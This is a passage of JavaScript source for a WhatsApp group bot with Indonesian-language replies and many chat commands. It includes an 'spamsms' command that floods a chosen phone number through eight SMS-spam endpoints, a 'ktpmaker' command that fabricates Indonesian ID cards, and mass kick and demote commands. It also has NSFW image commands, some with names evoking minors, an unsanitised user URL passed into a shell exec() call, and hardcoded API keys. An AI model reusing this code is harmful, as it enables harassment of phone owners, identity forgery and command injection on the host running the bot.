							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						zacky.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`)
						zacky.groupDemoteAdmin(from, mentioned)
					}
					break
					case 'demoteall':
			        if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
			        members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
			        zacky.groupDemoteAdmin(from, members_id)
			        break
	 		        case 'promoteall':
			        if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins && !isOwner) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
			        members_id = []
					for (let mem of groupMembers) {
				   	members_id.push(mem.jid)
				  	}
                    zacky.groupMakeAdmin(from, members_id)
                    break
					case 'addprem':
					case 'addpremium': //FIX BY MANIK
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb()) //owner only	
				expired = "30d"
				if (args.length < 1 ) return reply(' tag member')
				mente = `${args[0].replace('@','')}@s.whatsapp.net`
				const pnom = {id: mente , expired: Date.now() + toMs(expired) }
				const knom = mente
				snUser = createSerial(15)
				prem.push(pnom) 
				fs.writeFileSync('./database/user/prem.json',JSON.stringify(prem))
				premium.push(knom) 
				fs.writeFileSync('./database/user/premium.json',JSON.stringify(premium)) 
				zacky.sendMessage(from, ind.premadd(args[0]), text, {quoted: freply, sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg','base64')})
				break
				case 'delprem':
				case 'delpremium': //FIX BY MANIK
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
				if (args.length < 1 ) return reply(' tag member')
				mente = `${args[0].replace('@','')}@s.whatsapp.net`
 			   const lnom = {id: mente , expired: Date.now() + toMs(expired) }
 		       const mnom = mente
    		    prem.splice(lnom)
      	  	fs.writeFileSync('./database/user/prem.json',JSON.stringify(prem))
       		 premium.splice(mnom) 
 			   fs.writeFileSync('./database/user/premium.json',JSON.stringify(premium))
				zacky.sendMessage(from, ind.dellprem(args[0]), text, {quoted: freply, sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg','base64')})
				break 
				case 'premlist':
	            case 'listprem': 
	            //FIX BY MANIK
	            if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	            let listPremi = '「 *PREMIUM USER LIST* 」\n\n'
	            let nomorList = 0
	            const deret = getAllPremiumUser()
	            const arrayPremi = []
	            for (let i = 0; i < deret.length; i++) {
	            const checkExp = ms(getPremiumExpired(deret[i]) - Date.now())
	            arrayPremi.push(getAllPremiumUser()[i])
	            nomorList++
	            listPremi += `
${nomorList}. wa.me/${getAllPremiumUser()[i]}
➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
	            }
	            zacky.sendMessage(from, listPremi, text, {quoted: freply, sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg','base64')})
	            break
				case 'checkprem': //FIX BY MANIK
				const cekExp = ms(getPremiumExpired(sender) - Date.now())
				premtext =  `
*「 PREMIUM EXPIRED 」*

➸ *ID*: ${sender.split('@')[0]}
➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`
				zacky.sendMessage(from, premtext, text, {quoted: freply, sendEphemeral: true, thumbnail: fs.readFileSync('./lib/◇.jpeg','base64')}) 
				break				    
				case 'ban':
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
				bnnd = body.slice(5)
				ban.push(`${bnnd}@s.whatsapp.net`)
				fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
				reply(`Berhasil membanned nomor : wa.me/${bnnd} `)
				break
		        case 'unban':
				if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
				bnnd = body.slice(7)
				ban.splice(`${bnnd}@s.whatsapp.net`, 1)
				fs.writeFileSync('./database/user/banned.json', JSON.stringify(ban))
				reply(`Nomor wa.me/${bnnd} telah di unban!`)
				break
                case 'banlist':
				zacky.updatePresence(from, Presence.composing) 				
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})    
				teks = 'List anak² kontol yg diban :\n'
				for (let benn of ban) {
					teks += `~> @${benn.split('@')[0]}\n`
					}
					teks += `Total : ${ban.length}`
				zacky.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": ban}})
				break
				    case 'add':
					if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						zacky.groupAdd(from, [num])
					} catch (err) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
				    case 'kick':
					if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin())
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, mengeluarkan :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						zacky.groupRemove(from, mentioned)
					} else {
						mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
						zacky.groupRemove(from, mentioned)
					}
					break
				    case 'listadmins':
				    case 'listadmin':
					if (!isGroup) return reply(ind.groupo())
					teks = `List admin of group *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
					case 'listpc':
                    case 'listchat':
                    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					  cpcp = await getpc(totalchat)
					  teks = `*L I S T  P E R S O N A L  C H A T*\nJumlah PC: ${cpcp.length}\n\n`
					  for(let i = 0; i < cpcp.length; i++){						
						pushnama = zacky.contacts[cpcp[i]] != undefined ? zacky.contacts[cpcp[i]].vname || zacky.contacts[cpcp[i]].notify : undefined						
						teks += `• Nama : ${cpcp[i].pushnama}\n• Tag : @${cpcp[i].split("@")[0]}\n• Wa.me : wa.me/${cpcp[i].split("@")[0]}\n\n❖─────────────────────┈ ⳹\n\n`
					}
					mentions( teks, true)
					break 
                
                case 'linkgroup':
                case 'linkgrup':
                case 'linkgc':
                    if (!isGroup) return reply(ind.groupo())
                    if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.groupo())
                    if (!isBotGroupAdmins) return reply(ind.badmin())
                    linkgc = await zacky.groupInviteCode(from)
                    reply('https://chat.whatsapp.com/'+linkgc)
                    break
                    case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'resetlink':
         if (!isGroup) return reply(ind.groupo())
         if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.groupo())
         if (!isBotGroupAdmins) return reply(ind.badmin())
          json = ['action', 'inviteReset', from]
         zacky.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
         break
                case 'leave':
                case 'left':
                    if (!isGroup) return reply(ind.groupo())
                    if (isGroupAdmins && !mek.key.fromMe && isOwner) return                    
                    zacky.groupLeave(from)
                    break
                case 'join':
                case 'login':
                if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
                if (args.length == 0) return reply(`Link nya mana?\nContoh: https://chat.whatsapp.com/Kontolodon`)
                zacky.query({json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]})
                suksez = `Sukses Gabung Ke Grup Hambaque!`
                zacky.sendMessage(from, suksez, text,{quoted : freply, contextInfo: { forwardingScore: 1000, isForwarded: true}})
                break
                case 'creategroup':
                case 'creategrup':
                case 'buatgroup':
                case 'buatgrup':
			    if (!isGroup) return reply(ind.groupo())
                if (isGroupAdmins && !mek.key.fromMe && isOwner) return
				if (args.length < 1) return reply(`Penggunaan ${prefix + command} nama grup|@tag member`)
				argza = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					zacky.groupCreate(argza[0], anu)
					reply(`Sukes membuat grup:\n${argza}`)
                }
				break
				case 'inspect':                                
                case 'infogrup':
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link salah, Contoh:\nhttps://chat.whatsapp.com/kontolodon')
            if (!q) return reply('masukan link wa')
            try {
            cos = args[0]
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await zacky.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             zacky.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break             
                    case 'kickall':
                    if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
			        if (!isBotGroupAdmins) return reply(ind.badmin())
			        members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*╠➥* ${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					zacky.groupRemove(from, members_id)
					break
				    case 'toimg':
				    case 't':
				    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	 			    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isQuotedSticker) return reply('❌ reply stickernya tod ❌')										
						const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
						const meditos = await zacky.downloadAndSaveMediaMessage(encmedia)
						ran = getRandom('.png')
						exec(`ffmpeg -i ${meditos} ${ran}`, (err) => {
							fs.unlinkSync(meditos)
							if (err) return reply('❌ Gagal, pada saat mengkonversi sticker ke gambar  ❌')
							buffer = fs.readFileSync(ran)
							zacky.sendMessage(from, buffer, image, { thumbnail : fpp, quoted: mek, caption: 'Nih Cok'})
							fs.unlinkSync(ran)						
					})
					break
					case 'tomp4': case 'tovideo': {
                if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	 			    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isQuotedSticker) return reply('❌ reply stickernya tod ❌')
                let media = await zacky.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await zacky.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: mek })
                await fs.unlinkSync(media)
            }
            break
            case 'togif': {
               if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	 			    if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isQuotedSticker) return reply('❌ reply stickernya tod ❌')
                let media = await zacky.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await zacky.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: mek })
                await fs.unlinkSync(media)
            }
            break
				    case 'simi':
					if (args.length < 1) return reply('Textnya mana um?')
					teks = body.slice(5)
					anu = await simih(teks) //fetchJson(`https://mhankbarbar.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break
				    case 'simih':
					if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('Mode simi sudah aktif')
						samih.push(from)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Sukses mengaktifkan mode simi di group ini ✔️')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Sukes menonaktifkan mode simi di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
				    case 'welcome':
					if (!isGroup) return reply(ind.groupo())
				    if (!mek.key.fromMe && !isGroupAdmins) return reply(ind.admin())
					if (args.length < 1) return reply('ketik 1 untuk mengaktifkan')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Udah aktif um')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break
				    case 'clone':
					if (!isGroup) return reply(ind.groupo())
					if (!mek.key.fromMe && !isOwner) return reply(ind.ownerb())
					if (args.length < 1) return reply('Tag target yang ingin di clone')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await zacky.getProfilePicture(id)
						buffer = await getBuffer(pp)
						zacky.updateProfilePicture(botNumber, buffer)
						mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
					} catch (err) {
						reply('Gagal om')
					}
					break
				    case 'wait':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						reply(mess.wait)
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						media = await zacky.downloadMediaMessage(encmedia)
						await wait(media).then(res => {
							zacky.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
						}).catch(err => {
							reply(err)
						})
					} else {
						reply('Foto aja mas')
					}
					break
//=====================================PENAMBAHAN KEBAWAH COK=====================================\\
case 'triggered':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    ini_url = args[0]
                    ranp = getRandom('.gif')
                    rano = getRandom('.webp')
                    ini_buffer = `http://api.lolhuman.xyz/api/editor/triggered?apikey=${lolkey}&img=${ini_url}`
                    exec(`wget "${ini_buffer}" -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                        fs.unlinkSync(ranp)
                        buff = fs.readFileSync(rano)
                        zacky.sendMessage(from, buff, sticker, { quoted: mek})
                        fs.unlinkSync(rano)
                    })
                    break
                case 'wasted':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    ini_url = args[0]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/editor/wasted?apikey=${lolkey}&img=${ini_url}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'semoji':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😎`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${lolkey}`)
                    zacky.sendMessage(from, ini_buffer, sticker, { quoted: mek})
                    break
                case 'fakedonald':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/tweettrump?apikey=${lolkey}&text=${ini_txt}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                case 'faketoko':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    await faketoko(teks = "Tahu Bacem", url_image = "https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg", title = "Manik", code = "IDR", price = 1000000)
                    break
               
               // Creator By Lolhuman Team
                case 'ttp':
                if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Example: ${prefix + command} Manik`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    zacky.sendMessage(from, ini_buffer, sticker, { quoted: mek})
                    break
                case 'ttp2':
				if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
				 if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} Kata`)
                    txt = args.join(" ")
                    anu = await getBuffer(`https://lolhuman.herokuapp.com/api/ttp2?apikey=AkiraYT&text=${txt}`)
                    zacky.sendMessage(from, anu, sticker, { quoted: mek })
                    break                    
                  case 'ttp3':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
				if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} Kata`)
                    txt = args.join(" ")
                    anu = await getBuffer(`https://lolhuman.herokuapp.com/api/ttp3?apikey=AkiraYT&text=${txt}`)
                    zacky.sendMessage(from, anu, sticker, { quoted: mek })
                    break                    
				case 'ttp4':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())
				if (args.length == 0) return reply(`Usage: ${prefix + command} query\nContoh: ${prefix + command} Kata`)
                    txt = args.join(" ")
                    anu = await getBuffer(`https://lolhuman.herokuapp.com/api/ttp4?apikey=${lolkey}&text=${txt}`)
                    zacky.sendMessage(from, anu, sticker, { quoted: mek })
                    break
                    case 'attp':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply(ind.baned())				
				    if (args.length < 1) return reply(`_Teksnya Mana Boss_\n*Contoh ${prefix}attp ${pushname}*`)
				    attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
				    zacky.sendMessage(from, attp2, sticker, {quoted: mek})
				    break
                    case 'attp2':
		if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} MrA43G`)
                    teks = args.join(" ")
                    buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/attp?apikey=SoftApikey&text=${teks}`)
                    zacky.sendMessage(from, buffer, sticker, { quoted: mek})
                    break                    
                    case 'qrcode':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} loli`)
                    query = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/qrcode?apikey=SoftApikey&text=${query}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break
                    case 'apikeycek':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
		apiKey = args[0]
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/checkapikey?apikey=${lolkey}`)
                    get_result = get_result.result
                        txt = `User : ${get_result.username}\n`
                        txt += `Req : ${get_result.requests}\n`
                        txt += `Limit : ${get_result.today}\n`
                        txt += `Type : ${get_result.account_type}\n\n`
                        txt += `Expired : ${get_result.expired}\n\n`
                    reply(txt)
                    break
                    case 'ytkomen':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Manik api.lolhuman.xyz`)
		username = args[0]
		comment = args[2]
                    buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/ytcomment?apikey=SoftApikey&username=${username}&comment=${comment}&img=https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg`)
                    zacky.sendMessage(from, buffer, image, { quoted: mek})
                    break
                    case 'phkomen':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Manik api.lolhuman.xyz`)
		username = args[0]
		comment = args[2]
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/phcomment?apikey=SoftApikey&img=https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg&text=${comment}&username=${username}`)
                    zacky.sendMessage(from, buffer, image, { quoted: mek})
                    break
                    case 'amongus':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (isBanned) return reply('Lu sudah terbenned!')
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} MrA43G`)
                    buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/amongus?apikey=SoftApikey&text=${body.slice(9)}`)
                    zacky.sendMessage(from, buffer, sticker, { quoted: mek})
                    break
                    case 'tolol': 
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply('Teks nya mana ? titit ?')
				gatauda = body.slice(6)
				buffer = await getBuffer(`http://lolhuman.herokuapp.com/api/toloserti?apikey=${lolkey}&name=${gatauda}`, {method: 'get'})
				zacky.sendMessage(from, buffer, image, {quoted: mek})
				break
				    case 'emojitoimg': 
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (args.length < 1) return reply('Contoh: 😎')
				gatauda = body.slice(6)
				buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${gatauda}?apikey=SoftApikey`, {method: 'get'})
				zacky.sendMessage(from, buffer, image, {quoted: mek})
				break
				    case 'quotemaker':
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
			cf = `${body.slice(12)}`
                    txt1 = cf.split("/")[0];
                    txt2 = cf.split("/")[1];
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} Manik`)
                    text = args[0]
                    author = args[1]
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quotemaker2?apikey=${lolkey}&text=${text}&author=${author}`)
                    zacky.sendMessage(from, buffer, image, { quoted: mek})
                    break
				    case 'ktpmaker':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|Manik|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ktpmaker?apikey=${lolkey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    zacky.sendMessage(from, ini_buffer, image, { quoted: mek})
                    break

                case 'spamsms':
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
		if (!isPrem) return reply(`Perintah ini hanya khusus Premium Ketik ${prefix}owner Untuk Membeli Premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam1?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam2?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam3?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam4?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam5?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam6?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam7?apikey=${lolkey}&nomor=${nomor}`)
                    await fetchJson(`http://api.lolhuman.xyz/api/sms/spam8?apikey=${lolkey}&nomor=${nomor}`)
                    reply("Success")
                    break

                    // Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'loli':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
                    zacky.sendMessage(from, buffer, image, { quoted: mek})
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
	            if (!isPrem) return reply(`Perintah ini hanya khusus Premium\n Ketik ${prefix}owner Untuk Membeli Premium`)
                    bupper = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolkey}`)
                    zacky.sendMessage(from, bupper, image, { quoted: mek})
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
		        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
